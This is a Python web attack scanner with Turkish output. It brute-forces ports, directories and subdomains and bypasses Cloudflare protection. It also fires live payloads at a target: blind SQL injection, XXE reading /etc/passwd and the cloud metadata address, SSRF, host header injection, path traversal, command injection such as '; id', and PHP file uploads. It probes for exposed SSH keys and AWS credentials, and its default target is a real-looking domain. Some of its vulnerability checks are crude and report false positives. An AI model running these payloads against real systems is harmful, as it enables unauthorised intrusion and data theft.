#!/usr/bin/env python3

# pip install requests cloudscraper curl_cffi

import socket, ssl, requests, json, time, re, sys, hashlib, base64, random, urllib.parse
from datetime import datetime
from urllib.parse import urlparse, urljoin, parse_qs, urlencode
import urllib3
urllib3.disable_warnings()

# ============================================================
# RENKLER
# ============================================================
R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"; B = "\033[94m"
M = "\033[95m"; C = "\033[96m"; N = "\033[0m"; BOLD = "\033[1m"

# ============================================================
# CLOUDFLARE BYPASS (opsiyonel)
# ============================================================
try:
    import cloudscraper
    CLOUDSCRAPER_AVAILABLE = True
except:
    CLOUDSCRAPER_AVAILABLE = False

class CloudflareBypass:
    @staticmethod
    def create_session(use_bypass=False):
        if use_bypass and CLOUDSCRAPER_AVAILABLE:
            return cloudscraper.create_scraper(
                browser={
                    "browser": "chrome",
                    "platform": "windows",
                    "desktop": True
                }
            )
        return requests.Session()

# ============================================================
# ANA SCANNER
# ============================================================
class ProMaxPlusScanner:
    def __init__(self, target, bypass_cloudflare=False):
        self.target = target
        self.start = time.time()
        self.bypass_cloudflare = bypass_cloudflare
        self.session = CloudflareBypass.create_session(bypass_cloudflare)
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "*/*",
            "Connection": "keep-alive"
        })
        self.session.timeout = 3

        self.results = {
            "target": target,
            "bypass_cloudflare": bypass_cloudflare,
            "ports": [],
            "ssl": {},
            "headers": {},
            "security_headers": {},
            "waf": None,
            "cloud": None,
            "tech": [],
            "dirs": [],
            "subdomains": [],
            "vulns": [],
            "emails": [],
            "parameters": [],
            "api_endpoints": [],
            "backup_files": [],
            "interesting_files": [],
            "status_codes": {},
            "wp_users": [],
            "wp_plugins": [],
            "wp_version": None,
            "sqli_tests": [],
            "xss_tests": [],
            "open_redirect_tests": [],
            "api_fuzz": [],
            "websocket": {"found": False, "url": None},
            "grpc": {"found": False, "url": None},
            "blind_sqli_tests": [],
            "xxe_tests": [],
            "ssrf_tests": [],
            "csrf_tests": [],
            "jwt_tests": [],
            "cors_tests": [],
            "host_header_tests": [],
            "path_traversal_tests": [],
            "command_injection_tests": [],
            "file_upload_tests": []
        }

        # ============ DİZİNLER ============
        self.dirs = [
            "/", "/admin", "/login", "/wp-admin", "/phpmyadmin", "/.git", "/.env",
            "/robots.txt", "/sitemap.xml", "/favicon.ico", "/backup", "/test", "/dev",
            "/wp-content", "/wp-includes", "/server-status", "/cgi-bin",
            "/user", "/profile", "/dashboard", "/shop", "/cart", "/checkout",
            "/phpinfo.php", "/info.php", "/config.php", "/index.php", "/index.html",
            "/.htaccess", "/web.config", "/composer.json", "/package.json",
            "/api", "/api/v1", "/api/v2", "/api/v3", "/graphql", "/swagger", "/docs",
            "/.well-known", "/security.txt", "/crossdomain.xml",
            "/dump", "/export", "/import", "/sql", "/db", "/database",
            "/old", "/archive", "/copy", "/mirror", "/data", "/downloads",
            "/modules", "/themes", "/plugins", "/vendor", "/node_modules",
            "/tmp", "/logs", "/error", "/debug", "/status", "/health",
            "/oauth", "/auth", "/register", "/signup", "/reset-password",
            "/product", "/products", "/category", "/brand", "/collection",
            "/storage", "/cdn", "/static", "/assets", "/media", "/images",
            "/fonts", "/icons", "/avatar", "/logo", "/favicon",
            "/cpanel", "/plesk", "/webmail", "/mail", "/roundcube",
            "/adminer", "/pgadmin", "/phpPgAdmin", "/mysqladmin",
            "/server-info", "/.svn", "/.aws", "/.ssh", "/.ftp",
            "/Dockerfile", "/docker-compose.yml", "/Makefile", "/README.md",
            "/backup-old", "/temp", "/cache", "/forum", "/blog", "/news",
            "/download", "/upload", "/uploads", "/files", "/file",
            "/app", "/application", "/src", "/source", "/code", "/public",
            "/private", "/secure", "/secret", "/confidential", "/internal",
            "/backup.zip", "/backup.tar", "/backup.gz", "/backup.rar",
            "/wp-admin", "/wp-login.php", "/wp-register.php", "/wp-activate.php",
            "/wp-comments-post.php", "/wp-cron.php", "/wp-links-opml.php",
            "/wp-load.php", "/wp-mail.php", "/wp-settings.php", "/wp-signup.php",
            "/wp-trackback.php", "/xmlrpc.php", "/wp-json", "/wp-content",
            "/wp-includes", "/wp-admin/admin-ajax.php", "/wp-admin/admin-post.php",
            "/wp-admin/admin.php", "/wp-admin/async-upload.php",
            "/wp-admin/authorize-application.php", "/wp-admin/comment.php",
            "/wp-admin/credits.php", "/wp-admin/custom-header.php",
            "/wp-admin/customize.php", "/wp-admin/edit-comments.php",
            "/wp-admin/edit-form-advanced.php", "/wp-admin/edit-form-blocks.php",
            "/wp-admin/edit-link-form.php", "/wp-admin/edit-tags.php",
            "/wp-admin/edit.php", "/wp-admin/export.php", "/wp-admin/freedoms.php",
            "/wp-admin/import.php", "/wp-admin/index.php", "/wp-admin/install.php",
            "/wp-admin/link-add.php", "/wp-admin/link-manager.php",
            "/wp-admin/link-parse-opml.php", "/wp-admin/media-new.php",
            "/wp-admin/media-upload.php", "/wp-admin/menu-header.php",
            "/wp-admin/menu.php", "/wp-admin/moderation.php", "/wp-admin/my-sites.php",
            "/wp-admin/nav-menus.php", "/wp-admin/network",
            "/wp-admin/options-discussion.php", "/wp-admin/options-general.php",
            "/wp-admin/options-media.php", "/wp-admin/options-permalink.php",
            "/wp-admin/options-privacy.php", "/wp-admin/options-reading.php",
            "/wp-admin/options-writing.php", "/wp-admin/options.php",
            "/wp-admin/plugin-editor.php", "/wp-admin/plugin-install.php",
            "/wp-admin/plugins.php", "/wp-admin/post-new.php", "/wp-admin/post.php",
            "/wp-admin/press-this.php", "/wp-admin/privacy.php", "/wp-admin/profile.php",
            "/wp-admin/revision.php", "/wp-admin/upgrade.php", "/wp-admin/user-edit.php",
            "/wp-admin/user-new.php", "/wp-admin/users.php", "/wp-admin/widgets.php",
            "/.git/config", "/.git/HEAD", "/.git/index", "/.git/objects",
            "/.svn/entries", "/.svn/wc.db", "/.env", "/.env.backup",
            "/.aws/credentials", "/.ssh/id_rsa", "/.ssh/authorized_keys",
            "/upload", "/uploads", "/media", "/images", "/files", "/file", "/data", "/download", "/downloads"
        ]

        # ============ SUBDOMAIN ============
        self.subdomains = [
            "www", "mail", "ftp", "dev", "test", "stage", "staging", "api", "admin", "cdn",
            "static", "blog", "shop", "docs", "support", "demo", "backup", "old", "new",
            "beta", "alpha", "preprod", "uat", "qa", "vpn", "secure", "portal",
            "gateway", "edge", "internal", "office", "remote", "db", "mysql",
            "postgres", "mongodb", "redis", "elastic", "search", "analytics",
            "monitor", "grafana", "kibana", "prometheus", "jenkins", "git",
            "svn", "ci", "cd", "deploy", "build", "artifact", "registry",
            "auth", "oauth", "sso", "login", "signin", "app", "mobile", "m",
            "partner", "affiliate", "vendor", "customer", "ecommerce",
            "store", "cart", "payment", "pay", "news", "media", "video",
            "images", "img", "css", "js", "fonts", "icons", "assets",
            "data", "database", "sql", "postgres", "mongo", "redis",
            "cache", "memcache", "elasticsearch", "kibana", "grafana",
            "prometheus", "jenkins", "gitlab", "github", "bitbucket",
            "confluence", "wiki", "docs", "support", "help", "faq",
            "community", "forum", "groups", "lists", "mailman",
            "planet", "blogs", "news", "press", "media", "video",
            "download", "uploads", "files", "file", "data", "backup",
            "development", "testing", "quality", "staging", "stage",
            "preprod", "production", "prod", "live", "uat", "sandbox",
            "showcase", "presentation", "marketing", "sales", "info",
            "about", "contact", "support", "help", "career", "jobs"
        ]

        # ============ PORTLAR ============
        self.ports = [
            21,22,23,25,53,80,110,111,135,139,143,161,443,445,465,
            514,587,631,636,873,993,995,1080,1099,1352,1433,1521,1723,
            2049,2083,2087,2222,2401,3000,3128,3306,3389,3690,4352,
            4443,4646,5000,5001,5222,5223,5432,5544,5555,5666,5800,
            5900,5984,6379,7000,7001,7070,7171,7190,7443,7474,7475,
            7777,8000,8001,8008,8080,8081,8088,8090,8091,8092,8123,
            8140,8161,8181,8443,8448,8765,8888,9000,9001,9009,9010,
            9042,9090,9092,9100,9151,9160,9200,9300,9418,9999,
            10000,11000,11211,20000,27017,28015,29015,30000,32768
        ]

        self.total = len(self.dirs) + len(self.subdomains) + len(self.ports) + 50
        self.done = 0

        self.waf_sigs = {
            "Cloudflare": ["cf-ray", "__cfduid", "cloudflare"],
            "AWS WAF": ["x-amzn-requestid", "awswaf"],
            "Sucuri": ["sucuri", "x-sucuri-id"],
            "ModSecurity": ["modsecurity", "owasp"],
            "Wordfence": ["wordfence", "wfvt_"],
            "Akamai": ["akamai", "x-akamai"],
            "Imperva": ["incap_ses", "visid_incap"]
        }
        self.cloud_sigs = {
            "AWS": ["x-amz", "cloudfront", "s3.amazonaws"],
            "Cloudflare": ["cf-", "cloudflare"],
            "Google": ["x-gcs", "google-cloud"],
            "Azure": ["x-ms", "azure"],
            "Akamai": ["akamai", "x-ak"],
            "Fastly": ["x-fastly", "fastly"]
        }

    def log(self, msg, status="info"):
        icons = {"info":"[*]", "success":"[+]", "error":"[-]", "warning":"[!]", "found":"[>]", "critical":"[!]", "test":"[T]"}
        print(f"{icons.get(status, '[*]')} {msg}")

    def progress(self):
        pct = int((self.done / self.total) * 100) if self.total else 0
        bar = "#" * int(pct/4) + "-" * (25 - int(pct/4))
        eta = "..." if self.done == 0 else f"{int((self.total - self.done) * (time.time()-self.start) / max(1, self.done))}s"
        print(f"\r[PROG] {bar} {pct}% | {self.done}/{self.total} | ETA: {eta}", end="")
        if pct == 100: print()

    def get(self, url, **kwargs):
        try:
            return self.session.get(url, **kwargs)
        except:
            return None

    def post(self, url, **kwargs):
        try:
            return self.session.post(url, **kwargs)
        except:
            return None

    # ==================== 1. PORT ====================
    def port(self):
        self.log(f"Portlar taranıyor ({len(self.ports)})...", "scan")
        for p in self.ports:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                if s.connect_ex((self.target, p)) == 0:
                    self.results["ports"].append(p)
                    self.log(f"Port {p} ACIK", "found")
                s.close()
            except: pass
            self.done += 1
            if self.done % 20 == 0: self.progress()
        self.progress()

    # ==================== 2. SSL ====================
    def ssl(self):
        self.log("SSL kontrol...", "scan")
        try:
            ctx = ssl.create_default_context()
            with ctx.wrap_socket(socket.socket(), server_hostname=self.target) as s:
                s.settimeout(3)
                s.connect((self.target, 443))
                cipher = s.cipher()[0]
                self.results["ssl"] = {"active": True, "cipher": cipher}
                self.log(f"SSL Aktif - {cipher}", "success")
        except:
            self.results["ssl"] = {"active": False}
            self.log("SSL yok", "warning")
        self.done += 1; self.progress()

    # ==================== 3. HEADER ====================
    def header(self):
        self.log("Header'lar...", "scan")
        for proto in ["https", "http"]:
            try:
                r = self.get(f"{proto}://{self.target}", timeout=3, verify=False)
                if not r: continue
                headers = dict(r.headers)
                self.results["headers"] = headers
                for k, v in list(headers.items())[:12]:
                    self.log(f"{k}: {v[:50]}", "found")
                if "Server" in headers:
                    self.results["tech"].append(f"Server: {headers['Server']}")
                sec_headers = {
                    "Strict-Transport-Security": "HSTS eksik!",
                    "Content-Security-Policy": "CSP eksik!",
                    "X-Frame-Options": "Clickjacking riski!",
                    "X-Content-Type-Options": "MIME-sniff riski!"
                }
                for h, msg in sec_headers.items():
                    if h not in headers:
                        self.results["security_headers"][h] = "EKSIK"
                        self.log(f"Security Header: {h} -> {msg}", "warning")
                combined = str(headers).lower()
                for waf, sigs in self.waf_sigs.items():
                    if any(s in combined for s in sigs):
                        self.results["waf"] = waf
                        self.log(f"WAF: {waf}", "warning")
                for cloud, sigs in self.cloud_sigs.items():
                    if any(s in combined for s in sigs):
                        self.results["cloud"] = cloud
                        self.log(f"Cloud: {cloud}", "found")
                break
            except:
                continue
        self.done += 1; self.progress()

    # ==================== 4. DİZİN + TÜM TESTLER ====================
    def dir(self):
        self.log(f"Dizinler ({len(self.dirs)})...", "scan")
        for d in self.dirs:
            for proto in ["https", "http"]:
                try:
                    url = f"{proto}://{self.target}{d}"
                    r = self.get(url, timeout=2, verify=False, allow_redirects=False)
                    if not r: continue

                    if r.status_code in [200, 301, 302, 403, 401, 405, 500, 502, 503]:
                        self.results["dirs"].append({"path": d, "status": r.status_code})
                        self.results["status_codes"][str(r.status_code)] = self.results["status_codes"].get(str(r.status_code), 0) + 1
                        self.log(f"{d} -> {r.status_code}", "found")

                        # API
                        if d.startswith("/api") or d == "/graphql" or d == "/wp-json":
                            self.results["api_endpoints"].append({"path": d, "status": r.status_code})
                            self.log(f"API: {d} -> {r.status_code}", "found")

                        # WebSocket
                        if r.text and ('new WebSocket(' in r.text or 'ws://' in r.text or 'wss://' in r.text):
                            ws_match = re.search(r'(wss?://[^\s"\']+)', r.text)
                            if ws_match:
                                self.results["websocket"]["found"] = True
                                self.results["websocket"]["url"] = ws_match.group(1)
                                self.log(f"WebSocket: {ws_match.group(1)}", "found")

                        # gRPC
                        if r.headers and ("application/grpc" in str(r.headers) or "grpc-" in str(r.headers).lower()):
                            self.results["grpc"]["found"] = True
                            self.results["grpc"]["url"] = url
                            self.log(f"gRPC: {url}", "found")

                        # ==================== PARAMETRE BUL ====================
                        if r.text:
                            params = re.findall(r'\?([a-zA-Z0-9_]+)=', r.text)
                            for p in params:
                                if p not in self.results["parameters"]:
                                    self.results["parameters"].append(p)

                            # ==================== 1. BLIND SQLi ====================
                            for param in params[:5]:
                                for payload in ["' OR sleep(5)--", "\" OR sleep(5)--", "' OR pg_sleep(5)--"]:
                                    test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                                    try:
                                        start_t = time.time()
                                        test_r = self.get(test_url, timeout=10, verify=False)
                                        elapsed = time.time() - start_t
                                        if elapsed > 4:
                                            self.results["blind_sqli_tests"].append({"url": test_url, "payload": payload, "status": "BULUNDU!"})
                                            self.results["vulns"].append({"url": test_url, "type": f"Blind SQLi ({payload[:20]})"})
                                            self.log(f"Blind SQLi: {param} -> {elapsed:.1f}s BULUNDU!", "critical")
                                        # SADECE BULUNDU veya HATA loglanır, "Güvende" loglanmaz
                                    except Exception as e:
                                        self.results["blind_sqli_tests"].append({"url": test_url, "payload": payload, "status": "HATA"})
                                        self.log(f"Blind SQLi: {param} -> HATA", "error")

                            # ==================== 2. XXE ====================
                            if "xml" in url.lower() or (r.text and "xml" in r.text.lower()):
                                xxe_payloads = [
                                    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
                                    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://169.254.169.254">]><root>&test;</root>'
                                ]
                                for payload in xxe_payloads:
                                    try:
                                        test_r = self.post(url, data=payload, headers={"Content-Type": "application/xml"}, timeout=3, verify=False)
                                        if test_r and ("root" in test_r.text or "passwd" in test_r.text):
                                            self.results["xxe_tests"].append({"url": url, "payload": payload[:30], "status": "BULUNDU!"})
                                            self.results["vulns"].append({"url": url, "type": "XXE"})
                                            self.log(f"XXE: BULUNDU! ({url})", "critical")
                                        # "Güvende" loglanmaz
                                    except:
                                        self.results["xxe_tests"].append({"url": url, "payload": payload[:30], "status": "HATA"})
                                        self.log(f"XXE: HATA ({url})", "error")

                            # ==================== 3. SSRF ====================
                            ssrf_targets = ["169.254.169.254", "127.0.0.1", "localhost", "metadata.google.internal"]
                            for param in params[:5]:
                                for target in ssrf_targets:
                                    test_url = f"{url}?{param}={urllib.parse.quote(f'http://{target}')}"
                                    try:
                                        test_r = self.get(test_url, timeout=3, verify=False)
                                        if test_r and ("ec2" in test_r.text or "metadata" in test_r.text or "169.254" in test_r.text):
                                            self.results["ssrf_tests"].append({"url": test_url, "payload": target, "status": "BULUNDU!"})
                                            self.results["vulns"].append({"url": test_url, "type": f"SSRF ({target})"})
                                            self.log(f"SSRF: {target} -> BULUNDU!", "critical")
                                    except:
                                        self.results["ssrf_tests"].append({"url": test_url, "payload": target, "status": "HATA"})
                                        self.log(f"SSRF: {target} -> HATA", "error")

                            # ==================== 4. CSRF ====================
                            if r.text and "<form" in r.text.lower():
                                has_token = bool(re.search(r'csrf|token|_token|authenticity', r.text, re.IGNORECASE))
                                if not has_token:
                                    self.results["csrf_tests"].append({"url": url, "status": "TOKEN EKSIK!"})
                                    self.results["vulns"].append({"url": url, "type": "CSRF (token yok)"})
                                    self.log(f"CSRF: Token yok! ({url})", "critical")

                            # ==================== 5. JWT ====================
                            if r.text and ("jwt" in r.text.lower() or "Bearer" in r.text):
                                jwt_match = re.search(r'Bearer ([a-zA-Z0-9\-_]+?\.[a-zA-Z0-9\-_]+?\.[a-zA-Z0-9\-_]+)', r.text)
                                if jwt_match:
                                    token = jwt_match.group(1)
                                    parts = token.split('.')
                                    if len(parts) == 3:
                                        try:
                                            header = json.loads(base64.b64decode(parts[0] + '==').decode())
                                            alg = header.get('alg', 'none')
                                            self.results["jwt_tests"].append({"url": url, "alg": alg, "status": "BULUNDU"})
                                            self.log(f"JWT: {alg} alg ({url})", "found")
                                            if alg == 'none':
                                                self.results["vulns"].append({"url": url, "type": f"JWT none alg"})
                                                self.log(f"JWT: none alg! ({url})", "critical")
                                        except:
                                            pass

                            # ==================== 6. CORS ====================
                            if "Access-Control-Allow-Origin" in r.headers:
                                origin = r.headers.get("Access-Control-Allow-Origin")
                                self.results["cors_tests"].append({"url": url, "origin": origin})
                                if origin == "*":
                                    self.results["vulns"].append({"url": url, "type": "CORS (*)"})
                                    self.log(f"CORS: * ({url})", "critical")

                            # ==================== 7. Host Header Injection ====================
                            try:
                                host_headers = {"Host": "evil.com", "X-Forwarded-Host": "evil.com", "X-Host": "evil.com"}
                                for hname, hvalue in host_headers.items():
                                    test_r = self.get(url, timeout=2, verify=False, headers={hname: hvalue})
                                    if test_r and ("evil.com" in test_r.text or "evil" in test_r.text):
                                        self.results["host_header_tests"].append({"url": url, "header": hname, "status": "BULUNDU!"})
                                        self.results["vulns"].append({"url": url, "type": f"Host Header Injection ({hname})"})
                                        self.log(f"Host Header: {hname} -> BULUNDU!", "critical")
                            except:
                                pass

                            # ==================== 8. Path Traversal ====================
                            if params and any(x in url for x in ["file", "path", "dir", "page", "view", "load"]):
                                for payload in ["../../../../etc/passwd", "..\\..\\..\\windows\\win.ini", "../../etc/hosts"]:
                                    test_url = f"{url}?{params[0]}={urllib.parse.quote(payload)}"
                                    try:
                                        test_r = self.get(test_url, timeout=2, verify=False)
                                        if test_r and ("root:x" in test_r.text or "localhost" in test_r.text or "Forbidden" not in test_r.text):
                                            self.results["path_traversal_tests"].append({"url": test_url, "payload": payload, "status": "BULUNDU!"})
                                            self.results["vulns"].append({"url": test_url, "type": f"Path Traversal ({payload})"})
                                            self.log(f"Path Traversal: {payload} -> BULUNDU!", "critical")
                                    except:
                                        pass

                            # ==================== 9. Command Injection ====================
                            if params and any(x in url for x in ["ping", "cmd", "exec", "run", "shell", "system"]):
                                for payload in ["; ls", "; id", "&& id", "| whoami"]:
                                    test_url = f"{url}?{params[0]}={urllib.parse.quote(payload)}"
                                    try:
                                        test_r = self.get(test_url, timeout=2, verify=False)
                                        if test_r and ("uid" in test_r.text or "root" in test_r.text or "bin" in test_r.text):
                                            self.results["command_injection_tests"].append({"url": test_url, "payload": payload, "status": "BULUNDU!"})
                                            self.results["vulns"].append({"url": test_url, "type": f"Command Injection ({payload})"})
                                            self.log(f"Command Injection: {payload} -> BULUNDU!", "critical")
                                    except:
                                        pass

                            # ==================== 10. File Upload ====================
                            if "/upload" in d or "/uploads" in d:
                                php_content = '<?php echo "test"; ?>'
                                files = {'file': ('test.php', php_content, 'application/x-php')}
                                try:
                                    test_r = self.post(url, files=files, timeout=5, verify=False)
                                    if test_r and ("test" in test_r.text or "uploaded" in test_r.text.lower()):
                                        self.results["file_upload_tests"].append({"url": url, "status": "BULUNDU!"})
                                        self.results["vulns"].append({"url": url, "type": "File Upload (.php)"})
                                        self.log(f"File Upload: .php yüklenebilir! ({url})", "critical")
                                except:
                                    pass

                        break
                except:
                    continue
            self.done += 1
            if self.done % 5 == 0: self.progress()
        self.progress()

    # ==================== SUBDOMAIN ====================
    def sub(self):
        self.log(f"Subdomain'ler ({len(self.subdomains)})...", "scan")
        for sub in self.subdomains:
            try:
                domain = f"{sub}.{self.target}"
                socket.setdefaulttimeout(1)
                ip = socket.gethostbyname(domain)
                self.results["subdomains"].append({"domain": domain, "ip": ip})
                self.log(f"Sub: {domain} -> {ip}", "found")
            except: pass
            self.done += 1
            if self.done % 5 == 0: self.progress()
        self.progress()

    # ==================== RAPOR ====================
    def summary(self):
        elapsed = int(time.time() - self.start)
        print("\n" + "="*80)
        print(f"{BOLD}{C} TARAMA OZETI + 10 FIKIR{N}")
        print("="*80)
        print(f"{Y}Süre:{N} {elapsed}s")
        print(f"{Y}Bypass:{N} {'Aktif' if self.bypass_cloudflare else 'Kapali'}")
        print(f"{Y}Port:{N} {len(self.results['ports'])}")
        print(f"{Y}Dizin:{N} {len(self.results['dirs'])}")
        print(f"{Y}Subdomain:{N} {len(self.results['subdomains'])}")
        print(f"{Y}Vuln:{N} {len(self.results['vulns'])}")
        print(f"{Y}Parameter:{N} {len(self.results['parameters'])}")
        print("="*80)

        # Test sonuçları (sadece bulunanlar)
        tests = [
            ("Blind SQLi", "blind_sqli_tests"),
            ("XXE", "xxe_tests"),
            ("SSRF", "ssrf_tests"),
            ("CSRF", "csrf_tests"),
            ("JWT", "jwt_tests"),
            ("CORS", "cors_tests"),
            ("Host Header", "host_header_tests"),
            ("Path Traversal", "path_traversal_tests"),
            ("Command Injection", "command_injection_tests"),
            ("File Upload", "file_upload_tests")
        ]

        print(f"\n{BOLD}TEST SONUCLARI (BULUNANLAR){N}")
        found_any = False
        for name, key in tests:
            items = self.results.get(key, [])
            bulunan = [x for x in items if x.get("status") == "BULUNDU!" or x.get("status") == "TOKEN EKSIK!"]
            if bulunan:
                found_any = True
                print(f"  {R}{name}:{N} {len(bulunan)} bulundu")
                for item in bulunan[:5]:
                    print(f"    [!] {item.get('url', item.get('payload', ''))[:60]}")
        if not found_any:
            print(f"  {G}Hiç güvenlik açığı bulunamadı{N}")

        if self.results['vulns']:
            print(f"\n{R}TUM GUVENLIK ACIKLARI:{N}")
            for v in self.results['vulns'][:20]:
                print(f"  [!] {v['type']} -> {v['url'][:60]}")

    def save(self):
        fname = f"scan_{self.target}_{int(time.time())}.json"
        with open(fname, "w", encoding="utf-8") as f:
            json.dump(self.results, f, indent=2, default=str, ensure_ascii=False)
        self.log(f"Rapor: {fname}", "success")

    def run(self):
        print(f"{BOLD}{M} SCANNER + 10 FIKIR + CLOUDFLARE BYPASS{N}")
        print(f"{B}Bypass: {'AKTIF' if self.bypass_cloudflare else 'KAPALI'}{N}\n")

        self.port()
        self.ssl()
        self.header()
        self.dir()
        self.sub()
        self.done = self.total
        self.progress()
        self.summary()

        if input("\nRaporu kaydet? (E/H): ").upper() == "E":
            self.save()

# ============================================================
def main():
    print(f"{BOLD}╔═══════════════════════════════════════════════╗")
    print(f"║ {C} SCANNER + 10 FIKIR{BOLD}                       ║")
    print(f"║ {Y}Blind SQLi | XXE | SSRF | CSRF | JWT{BOLD}     ║")
    print(f"║ {M}CORS | Host Header | Path Traversal{BOLD}      ║")
    print(f"║ {G}Command Injection | File Upload{BOLD}          ║")
    print("╚═══════════════════════════════════════════════╝\n")

    target = input("Hedef: ").strip() or "silvacheck.com"

    print("\n🔧 Cloudflare bypass açılsın mı?")
    print("   [E] Evet (cloudscraper ile istek yapar)")
    print("   [H] Hayır (normal requests kullanır)")
    bypass = input("> ").upper().strip()
    bypass_cloudflare = bypass == "E"

    if bypass_cloudflare and not CLOUDSCRAPER_AVAILABLE:
        print("⚠️ cloudscraper yüklü değil! pip install cloudscraper")
        bypass_cloudflare = False

    scanner = ProMaxPlusScanner(target, bypass_cloudflare)
    scanner.run()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nCikis.")
    except Exception as e:
        print(f"\n{R}Hata: {e}{N}")
